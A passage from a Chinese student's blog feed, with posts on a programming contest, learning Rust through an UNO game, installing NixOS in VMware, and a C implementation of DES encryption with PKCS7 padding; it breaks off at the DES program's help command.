&lt;p&gt;蓝桥杯本来就是圈钱的水赛，为了卖课办的比赛，频频爆出作弊丑闻，现在甚至干脆不公布获奖名单了。真是厚颜无耻，估计以后不再参加了，要不就去参加某些区域天梯赛什么的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8F%82%E8%B5%9B%E8%AE%B0-1751985845704.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;今年的省赛北京这边非常简单，有些人反而因为大意遭遇滑铁卢了。国赛的话听说C/C++组那边很难。Python倒是还好，10道题中我做了8道，估计在国二当中属于前部，靠近国一的。&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 07 Jul 2025 16:00:00 GMT</pubDate></item><item><title>入门体验Rust | Rust</title><link>https://tankimzeg.top/blog/rust/new-in-rust/</link><guid isPermaLink="true">https://tankimzeg.top/blog/rust/new-in-rust/</guid><description>入门Rust的学习和第一个项目</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/rust/new-in-rust/&quot;&gt;https://tankimzeg.top/blog/rust/new-in-rust/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;为什么学习Rust&lt;/h2&gt;
&lt;p&gt;这几年，由于Rust传教士的努力，Rust进入了大家的视野，给人一种未来大势所趋的感觉。好像是去年年中的时候，我第一次听说了这个编程语言，了解到它受吹捧的优势。我向来思想开明，对新兴事物充满兴趣和热情，于是决定学习，作为C++的替代品。&lt;/p&gt;
&lt;p&gt;我以前在leetcode上刷题的时候注意到它们的题的函数签名有类型注释，我才发现Python有这样的特性。后来我尝试培养这一习惯，发现非常爽！既有利于Pylance解释器提醒我写项目的过程中没有考虑到的情况（引发Bug的原因之一），也有利于动手写代码之前明确每个函数的作用，自顶向下设计程序。软件工程简直是一种艺术般的构思！&lt;/p&gt;
&lt;p&gt;我看到Youtube上&lt;a href=&quot;https://www.youtube.com/@Indently&quot;&gt;这位博主&lt;/a&gt;也有写类型注释的习惯，跟我不谋而合。他介绍的一些Python技巧也给我很多帮助，Python居然能写得这么爽！最近他也开始发Rust的视频了。&lt;/p&gt;
&lt;p&gt;这是一个很好的契机。暑假，我终于有时间具体学习一下。&lt;/p&gt;
&lt;h2&gt;学习感受&lt;/h2&gt;
&lt;p&gt;Rust代码给人一种很丑的感觉，而且其学习曲线陡峭，所有权、生命周期这些概念也令新手恐惧。去年的时候我就看过Rust官方的一点文档，当时还是直接看英语文档。但当我最近再去找教程时，发现质量和数量都有了很大提升，而且也有了中文翻译，集合在一起，这不仅为新手的学习提供了很大的帮助，也能为开发过程中查找API用法提供便利。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://rustwiki.org/docs/&quot;&gt;Rust中文文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;花了两天时间，我学到了Rust程序设计语言的第12章：&lt;a href=&quot;%5D(https://rustwiki.org/zh-CN/book/ch12-00-an-io-project.html)&quot;&gt;一个I/O项目：构建命令行程序&lt;/a&gt;，跟着教程做了一遍。&lt;/p&gt;
&lt;p&gt;由于我没学过C++，而且Rust自身也有奇怪的语法糖，我觉得很别扭，特别是if let，match这些基础的语法糖，还有很多错误处理的方法。不过好在我懂计算机程序底层，能够很快理解生命周期和设立所有权的原因。这么搞的话安全性确实高，甚至有点过于苛刻了。在下面的入门项目中我得到了深刻体会。&lt;/p&gt;
&lt;h2&gt;初学Rust的第一个入门项目&lt;/h2&gt;
&lt;p&gt;受bilibili视频 &lt;a href=&quot;https://www.bilibili.com/video/BV11f4xekEqz&quot;&gt;Python，但是用Rust的写法&lt;/a&gt; 的启发，我决定写一个UNO游戏，作为练习项目。&lt;/p&gt;
&lt;p&gt;实际上项目没有用到生命周期标注和只能指针那些东西，如果硬要减少开销，应该是能用上的。在一个结构体的方法中，如果需要对结构体的某一个字段进行可变引用，就要对方法传入整个结构体的可变引用，因而此时及时是对另一个不相干的字段的修改也是不行的。这真是太苛刻了，不过好像在后面的RefCall可以解决，我在写这个项目时还不会，造成了一些不便。&lt;/p&gt;
&lt;p&gt;Rust的测试非常好用！我通过编写许多测试，甚至不需要调试程序，编译器通过了就没问题，除了处理逻辑上的疏忽（UNO虽然在卡牌游戏里算简单的，但毕竟还是有很多种情况的）。另外编译器的报错提示很明确，很快就能确定问题所在。所以，我居然只用1天时间就写出来了这个简陋的命令行游戏，换做C语言现在肯定还在用打印调试呢！Python可能能快一点，不过看在我对Rust的写法、项目管理不熟悉的前提下，我对这样的开发体验还是很满意的，完全超出了我的预料，何况编译型语言的速度是解释型语言不能比的。&lt;/p&gt;
&lt;p&gt;虽然现在这个项目是一个非常基础的库crate，只能单机自娱自乐，离我设想的网络游戏应用还差一整套网络编程，不过游戏的逻辑和接口都有了。我觉得项目管理和函数实现上应该还有更好的实践，随着我对Rust学习的深入，我希望能逐步完善这个项目！&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;cargo run --example example&lt;/code&gt; 命令运行示例程序:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/new-in-rust.png&quot; alt=&quot;运行&quot;&gt;&lt;/p&gt;
&lt;p&gt;源代码已上传至Github:&lt;/p&gt;
&lt;p&gt;import RepositoryCard from &amp;quot;@/components/mdx/RepositoryCard.astro&amp;quot;;&lt;/p&gt;
&lt;RepositoryCard repo=&quot;TanKimzeg/uno&quot; image=&quot;https://raw.githubusercontent.com/TanKimzeg/uno/main/.github/image.png&quot;/&gt;</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 07 Jul 2025 16:00:00 GMT</pubDate></item><item><title>体验NixOS | NixOS</title><link>https://tankimzeg.top/blog/distro/new-in-nixos/</link><guid isPermaLink="true">https://tankimzeg.top/blog/distro/new-in-nixos/</guid><description>在VMware中安装体验NixOS</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/distro/new-in-nixos/&quot;&gt;https://tankimzeg.top/blog/distro/new-in-nixos/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;Linux Experience&lt;/h2&gt;
&lt;p&gt;很长一段时间,我默默了解过很多Linux发行版,发表一下个人的看法吧.&lt;/p&gt;
&lt;p&gt;忘记是怎么听说的Linux,大一寒假时我心血来潮,突然想在VMware中安装Linux.我安装的第一个发行版是Ubuntu,毕竟是网上说的最多的&amp;quot;新手入门&amp;quot;发行版.然后又因为专业相关,安装了Kali,Kali有虚拟机版的vmx文件,安装比Ubuntu简单多了.而且桌面观感也比Ubuntu那配色顺眼多了.&lt;/p&gt;
&lt;p&gt;当时装完之后就没有怎么理它,也不知道要用来干什么,搁置了许久.&lt;/p&gt;
&lt;p&gt;后来我发现了Windows上的WSL功能,由于Ubuntu并没有给我很好的印象,居然有那么多人推荐,我好像产生了逆反心理🙄,了解到Ubuntu基于Debian后,我在&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;wsl --list --online
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;列出的可安装的发行版中看到了Debian,于是果断选了Debian.在WSL中熟悉了Debian系的apt包管理器.Debian 确实比臃肿的Ubuntu好多了.&lt;/p&gt;
&lt;p&gt;2024年底,我折腾Github学生认证并且通过了,于是去微软的Azure上搞了个迷你服务器玩(即本站,也提供影梭服务),也选了Debian12,除了1G1vCPU运行一些多余的功能容易卡死外(现在我已经玩杜绝那些花里胡哨的服务了),运行得非常稳定.此时我也听说Debain适合做服务器,符合我的预期.&lt;/p&gt;
&lt;p&gt;在2025年寒假,我学习CMU 15213 CS:APP课程,我用WSL CLI中Linux环境,然后在主机用VS Code+WSL插件编程,体验很好(难道WSL2才是最好的发行版🤫).同时CS:APP课程使我更进一步了解Linux操作系统,对Linux产生多方面的兴趣.&lt;/p&gt;
&lt;p&gt;而对于桌面环境,常常听说Arch Linux,但是它有&amp;quot;滚挂&amp;quot;的风险,让我担忧.Kali的xfce确实漂亮,自带的zsh也顺手,也许应该选用Kali作为主力桌面系统?&lt;/p&gt;
&lt;p&gt;为了做学校课程实验(搭建在内网),我需要安装Easy Connect.我听说Easy Connect是流氓软件,只好在Kali的虚拟机里面安装Easy Connect.下载.deb包,dpkg 安装,点击运行却没有反应...经过一番原因的排查,原来是动态链接库缺失(或版本不对).解决方法是下载3个对应版本的.so文件,放到安装目录里,再次运行就成功.&lt;/p&gt;
&lt;p&gt;结合一下CS:APP中学过的&lt;a href=&quot;https://tankimzeg.top/blog/csapp/linking&quot;&gt;动态链接库&lt;/a&gt;知识,我预见了这一问题的严重性.如果某package的依赖不能被满足(我用apt安装docker时遇到),或者依赖升级后不兼容了(上文的Easy Connect),软件就会悄无声息地挂掉.到下一次使用时才能发现,到时候难以排查原因.&lt;/p&gt;
&lt;p&gt;这段时间,NixOS进入了我的视野,我一下子意识到它的理念正能解决这个问题.&lt;/p&gt;
&lt;p&gt;我仿佛能从其先进的理念中看到未来,但同时,它的门槛又好像在说生人勿近.跟Rust给我的感觉一样.&lt;/p&gt;
&lt;h2&gt;Nix: A Package Manager&lt;/h2&gt;
&lt;p&gt;包管理器是做什么的?我们可能在包管理中遇到什么问题?&lt;/p&gt;
&lt;p&gt;从nmp,pip,cargo,到apt,yum,pacman.它们都叫做&amp;quot;包管理器&amp;quot;.究竟包管理器是做什么的?&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/265309587&quot;&gt;Linux 黑话解释：什么是包管理器？它是如何工作的？&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个“ &lt;em&gt;包(package)&lt;/em&gt;”（或“软件包”）通常指的是一个应用程序，它可以是一个 GUI 应用程序、命令行工具或（其他软件程序需要的）软件库。包本质上是一个存档文件，包含二进制可执行文件、配置文件，有时还包含依赖关系的信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;在旧时代，&lt;a href=&quot;https://itsfoss.com/install-software-from-source-code/&quot;&gt;软件曾经是从它的源代码安装的&lt;/a&gt;。你会参考一个文件（通常命名为 &lt;code&gt;README&lt;/code&gt;），看看它需要什么软件组件、二进制文件的位置。它通常包括一个配置脚本或 &lt;code&gt;Makefile&lt;/code&gt;。你必须自己编译该软件或自己处理所有的依赖关系（有些软件需要安装其他软件）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;为了摆脱这种复杂性，Linux 发行版创建了自己的打包格式，为终端用户提供随时可用的二进制文件（预编译软件），以便安装软件，同时提供一些&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.computerhope.com/jargon/m/metadata.htm&quot;&gt;元数据&lt;/a&gt;（版本号、描述）和依赖关系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;包管理器是现代软件开发中不可或缺的工具，它们的主要功能可以概括为以下几个方面：&lt;/p&gt;
&lt;h4&gt;核心功能&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;软件包的安装与卸载&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动化下载软件及其依赖项&lt;/li&gt;
&lt;li&gt;提供简单的命令完成复杂安装过程（如&lt;code&gt;npm install&lt;/code&gt;或&lt;code&gt;apt install&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;依赖关系管理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动解决软件间的依赖关系&lt;/li&gt;
&lt;li&gt;确保所有必需的组件都能正确安装&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;版本控制&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;允许指定特定版本的软件包&lt;/li&gt;
&lt;li&gt;处理不同版本间的兼容性问题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;其他重要功能&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;更新维护&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检查并安装可用更新&lt;/li&gt;
&lt;li&gt;保持系统或项目中的软件处于最新状态&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;仓库管理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;提供中央化的软件仓库（如PyPI、CRAN等）&lt;/li&gt;
&lt;li&gt;支持添加第三方仓库源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;配置管理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自动完成软件的初始配置&lt;/li&gt;
&lt;li&gt;管理环境变量和路径设置&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;安全检查&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;验证包的签名或哈希值,防止恶意软件植入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;不同领域的包管理器对以上功能&lt;strong&gt;各有侧重&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Nix 作为一款独特的包管理器，相较于传统包管理器和其他依赖管理工具（如 Docker、虚拟环境等），具有以下显著优势：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;声明式配置与可复现能力&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;声明式管理&lt;/strong&gt;：Nix 使用声明式语言定义软件包及其依赖关系，用户只需描述系统应达到的状态，而非具体安装步骤。这种方式使得配置更清晰、可维护性更高，且支持版本控制（如 Git），便于团队协作和长期维护。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;可复现性&lt;/strong&gt;：通过 &lt;code&gt;flake.lock&lt;/code&gt; 文件锁定所有依赖的版本和哈希值，确保在不同机器上构建完全一致的环境。例如，NixOS 的系统配置可以精确复现，避免“在我的机器上能运行”的问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;strong&gt;纯函数式包管理与隔离性&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;独立环境&lt;/strong&gt;：每个软件包及其依赖被存储在唯一的路径（包含哈希值），不同版本的包互不干扰。例如，Python 项目的不同版本依赖可在同一系统中共存，无需虚拟环境。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无依赖冲突&lt;/strong&gt;：传统包管理器常因依赖版本冲突导致系统崩溃，而 Nix 通过隔离安装路径彻底解决了这一问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;&lt;strong&gt;多版本支持与灵活的回滚机制&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多版本共存&lt;/strong&gt;：开发者可同时安装同一软件的多个版本（如 Node.js 或 Python），并通过环境变量快速切换，适合多项目开发需求。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;系统级回滚&lt;/strong&gt;：NixOS 默认保留所有历史配置，用户可随时回滚到任意旧版本，甚至通过启动菜单选择历史系统状态，极大提升了系统稳定性。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;&lt;strong&gt;跨平台与轻量级开发环境&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;跨平台支持&lt;/strong&gt;：Nix 不仅支持 Linux（如 NixOS），还可在 macOS 和 Windows（通过 WSL）上运行。例如，macOS 用户可通过 &lt;code&gt;nix-darwin&lt;/code&gt; 实现类似 NixOS 的系统级配置管理，避免 Homebrew 的路径污染和速度问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;轻量级隔离&lt;/strong&gt;：相比 Docker 或虚拟机，Nix 通过声明式配置创建隔离的开发环境，无需虚拟化开销。例如，使用 &lt;code&gt;nix-shell&lt;/code&gt; 可为单个项目临时加载特定依赖，不污染全局环境。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;5&quot;&gt;
&lt;li&gt;&lt;strong&gt;社区与生态优势&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;丰富的软件仓库&lt;/strong&gt;：官方仓库 &lt;code&gt;nixpkgs&lt;/code&gt; 提供超过 80,000 个软件包，覆盖主流开发工具和库。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;活跃的社区创新&lt;/strong&gt;：尽管 Flakes 仍为实验特性，但社区已广泛采用，GitHub 上超过半数的新 Nix 项目使用 Flakes 管理依赖，推动生态快速演进。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;6&quot;&gt;
&lt;li&gt;&lt;strong&gt;自动化构建&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;自动化编译与缓存&lt;/strong&gt;：若二进制缓存中存在相同哈希的预编译包，Nix 会自动下载，否则触发本地编译，提升效率。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;对比传统工具的具体场景优势&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;vs Homebrew&lt;/strong&gt;：Nix 避免污染系统路径（如 &lt;code&gt;/usr/local&lt;/code&gt;），安装更安全；支持多版本共存，且配置可版本化。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;vs Docker&lt;/strong&gt;：Nix 无需容器化开销，直接通过声明式配置管理环境，更适合本地开发和轻量级隔离。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;vs 虚拟环境（如 Python venv）&lt;/strong&gt;：Nix 提供系统级隔离，支持跨语言依赖管理，减少手动配置复杂度。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;以上DeepSeek回答(做过删改)大致梳理了包管理器的作用,包管理可能存在的问题以及Nix的解决方案.&lt;/p&gt;
&lt;h2&gt;&lt;a href=&quot;https://nixos.org/guides/how-nix-works/&quot;&gt;How NixOS work?&lt;/a&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;标题链接一定要阅读  ↑&lt;/strong&gt;&lt;/em&gt;,官方的解释已经非常好.以下是我自己的理解.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;NixOS是以Nix理念构建起来的系统,所以它将Nix的优点拓展到了整个系统.&lt;/p&gt;
&lt;p&gt;以往,当我们安装一个崭新的Linux系统后,想要安装各种服务/软件,都是通过命令的形式,或者编辑分散在各处的.config文件.且不说命令没有良好的记录,就算记录下来了,想要倒回去也麻烦.这就导致了我们配置的系统是一个&amp;quot;黑盒&amp;quot;状态,无法在另一个新主机上复现.&lt;/p&gt;
&lt;p&gt;而NixOS以类似于configuration.nix文件声明系统状态,集中管理系统,然后用nixos-rebuild命令重构系统.声明是正道,命令是忌讳.这是我作为一个新手的理解.&lt;/p&gt;
&lt;p&gt;因此,系统的状况一目了然,系统的迁移易如反掌.我觉得在服务器集群管理的情境下是很有应用前景的.但由于技术惯性,还不愿采用.&lt;/p&gt;
&lt;p&gt;作为个人用户,这样的系统非常洁净,配置好后非常稳定,一劳永逸.挂掉(只要遵循声明式的准则基本不可能)也能像Git那样回滚.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Reproducible,Declarative,Reliable&lt;/strong&gt;&lt;/em&gt; 是&lt;a href=&quot;https://nixos.org&quot;&gt;NixOS官网&lt;/a&gt;上给出的三个特点.&lt;/p&gt;
&lt;p&gt;不得不说,这玩意实在太过小众,(中文)资料欠缺,也不讲新手的主要困惑,以至于没有一个能讲清楚Nix,flake,Home Manager分别用来解决什么问题,这些困惑差点劝退我.正当我面对Github上别人长长的配置仓库一筹莫展时,幸运地发现Youtube的几个视频讲的不错.如
&lt;a href=&quot;https://www.youtube.com/watch?v=nLwbNhSxLd4&quot;&gt;Full NixOS Guide: Everything You Need to Know in One Place!&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这几个播放量还挺高的,搜NixOS都有.可以都看看.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nix的这个雪花logo❄️,我还没看到有人介绍它的来历,不过我直觉猜它是由&amp;quot;依赖&amp;quot;具象而来的.你看它一个分支勾着一个分支,就像包的依赖关系.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;安装实录&lt;/h2&gt;
&lt;p&gt;在虚拟机(VMware)中安装，直接从图形化安装界面开始:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nixos.org/manual/nixos/stable/#sec-installation-graphical&quot;&gt;Graphical Installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/new-in-nixos-1745499307445.png&quot; alt=&quot;开始安装&quot;&gt;&lt;/p&gt;
&lt;p&gt;会在46%停留非常非常久...&lt;/p&gt;
&lt;p&gt;放了一晚上,第二天来看就好了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/new-in-nixos-1745538958782.png&quot; alt=&quot;安装成功&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果不是从命令行安装/手动分区的话还是非常简单的.&lt;/p&gt;
&lt;p&gt;欢迎打开新世界的大门! 我将持续记录一个新手使用NixOS的心路历程😎&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 25 Apr 2025 16:00:00 GMT</pubDate></item><item><title>C语言实现DES密码算法</title><link>https://tankimzeg.top/blog/implementation-des-in-c/</link><guid isPermaLink="true">https://tankimzeg.top/blog/implementation-des-in-c/</guid><description>为加深对DES密码算法的理解而用C语言编程实现</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/implementation-des-in-c/&quot;&gt;https://tankimzeg.top/blog/implementation-des-in-c/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;import RepositoryCard from &amp;quot;@/components/mdx/RepositoryCard.astro&amp;quot;;&lt;/p&gt;
&lt;p&gt;项目地址：
&lt;RepositoryCard repo=&quot;TanKimzeg/uno&quot; image=&quot;https://github.com/PrekrasnoyeDalekov/DES&quot;/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本项目约700行代码,以后将考虑增加多线程的功能.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;DES简介&lt;/h2&gt;
&lt;p&gt;DES全称为Data Encryption  Standard，即数据加密标准，是一种使用密钥加密的&lt;strong&gt;对称密码算法&lt;/strong&gt;，1977年被美国联邦政府的国家标准局确定为联邦资料处理标准（FIPS），并授权在非密级政府通信中使用，随后该算法在国际上广泛流传开来。&lt;/p&gt;
&lt;p&gt;有关DES算法本身的过程和原理,教科书和网上都有大量资料,这里不再赘述.本文主要讲我写代码的过程以及解决的问题.&lt;/p&gt;
&lt;h2&gt;密钥处理&lt;/h2&gt;
&lt;p&gt;DES的密钥是64位,其中8位不用,其实是56位的密钥空间.加密和解密,16轮变换,首先都需要先产生子密钥.我也是从这里入手的.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0DES%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-%E5%AD%90%E5%AF%86%E9%92%A5%E7%9A%84%E7%94%9F%E6%88%90.png&quot; alt=&quot;子密钥的生成&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先初始密钥64位经过压缩置换1变为56位,分割为左边28位C0和右边28位D0.之后的$C_{i}$和$D_{i}$都是由$C_{i-1}$和$D_{i-1}$循环左移得到的.&lt;/p&gt;
&lt;p&gt;$C_{i}$和$D_{i}$拼在一起得到56位,再经过压缩变换2变成48位的$K_{i}(i=1,2,3,\dots,16)$是16轮feistel网络变换的子密钥.&lt;/p&gt;
&lt;p&gt;在我的代码中,&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/DES/blob/main/cipherkey.c&quot;&gt;cipher.c&lt;/a&gt;的 &lt;code&gt;fill_CDK&lt;/code&gt;函数实现了16轮子密钥的生成.&lt;/p&gt;
&lt;p&gt;压缩置换1(PC_1)和压缩置换2(PC_2)的含义是,第i个位置为原数据的第PC_1[i]/PC_2[i]位(有点绕对吧)&lt;/p&gt;
&lt;h2&gt;64位数据的加密过程&lt;/h2&gt;
&lt;p&gt;在&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/DES/blob/main/encrypt.c&quot;&gt;encrypt.c&lt;/a&gt;中,我实现了对一个完整8字节数据的加密.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0DES%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B.png&quot; alt=&quot;加密过程&quot;&gt;
&lt;em&gt;加密过程&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0DES%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95-f%E5%87%BD%E6%95%B0.png&quot; alt=&quot;f函数&quot;&gt;
&lt;em&gt;f函数&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;64位数据的解密过程&lt;/h2&gt;
&lt;p&gt;解密过程实际上和加密过程的步骤&lt;strong&gt;相同&lt;/strong&gt;,只是每一轮的密钥是加密的密钥的逆序.这正是这一对称密码算法的精妙之处.&lt;/p&gt;
&lt;h2&gt;消息加密解密,文件加密解密的实现&lt;/h2&gt;
&lt;p&gt;其实,完成以上8字节的加密解密,估计已经能交&amp;quot;实验报告&amp;quot;了.但是作为我这种水平的人,怎么可能止步于此?于是,我开启了文件IO的自我折磨.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DES密码算法处理数据按字节流进行(类似于大端序),而在大多数智能设备上,存储整数的字节序是小端序.64位数据是DES加密解密的最小单元,我一开始把这64位数据真的当成了一个&amp;quot;数&amp;quot;而采用了小端序(为了加密后的结果是十六进制的&lt;em&gt;&lt;strong&gt;可视字符串数字&lt;/strong&gt;&lt;/em&gt;),项目几乎完成后才发觉不太好,因为&lt;code&gt;fscanf&lt;/code&gt;函数读取十六进制的&lt;code&gt;unsinged long long&lt;/code&gt;可能影响效率,不如&lt;code&gt;fread&lt;/code&gt;函数一次性读取8字节快.由于我普遍采用了这一逻辑,其实也有利有弊,(看到加密后的HEX数字,能增强我调试的信心😆;但是作为完美主义者,又忍不住想优化).本项目仅作为演示DES算法,将就这样了.读者应想清楚这一点,选择合适自己的实践方式.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先,DES算法是分块加密算法,每个数据块都是8字节,对于文本和文件来说,如果大小不是8字节的倍数,就需要补齐.&lt;/p&gt;
&lt;p&gt;本项目采用的是&lt;strong&gt;PKCS7&lt;/strong&gt;填充规则:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对于末尾不满8字节的数据块,缺i个字节,就填充i个字节,且填充字节的值为i.&lt;/li&gt;
&lt;li&gt;对于末尾满8字节的数据块,填充8个&lt;code&gt;0x08&lt;/code&gt;字节&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果只有第一条规则没有第二条规则,可能出现一种情况就是数据块是8字节但最后一个字节是0x01,这样会无法判断是否剥去这个字节.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我的小端序实现不影响PKCS7填充,读者可以想想为什么.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我的代码中提供了
&lt;code&gt;encryptMessage&lt;/code&gt;, &lt;code&gt;encryptFile&lt;/code&gt;, &lt;code&gt;decryptMessgae&lt;/code&gt;和 &lt;code&gt;decryptFile&lt;/code&gt;函数来分别实现加密和解密,他们读取逻辑都不太一样,十分烧脑!还好我有Github Copilot,帮了我一点忙.&lt;/p&gt;
&lt;p&gt;说实话,这样混乱的读取逻辑让我十分不满意,但或许涉及文件IO都是如此吧,之前网络编程的时候&lt;code&gt;receive&lt;/code&gt;和 &lt;code&gt;send&lt;/code&gt;也是相似的感觉,那时只需考虑读净写净,这里还要考虑format,十分恶心.&lt;/p&gt;
&lt;h2&gt;文件重定向的处理&lt;/h2&gt;
&lt;p&gt;最后编写&lt;code&gt;main&lt;/code&gt;函数,根据程序设计的功能和用户输入来确定程序的逻辑流,多一些判断增强程序的健壮性,最后搞得跟GNU命令行软件一样有模有样😎:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./DES -h
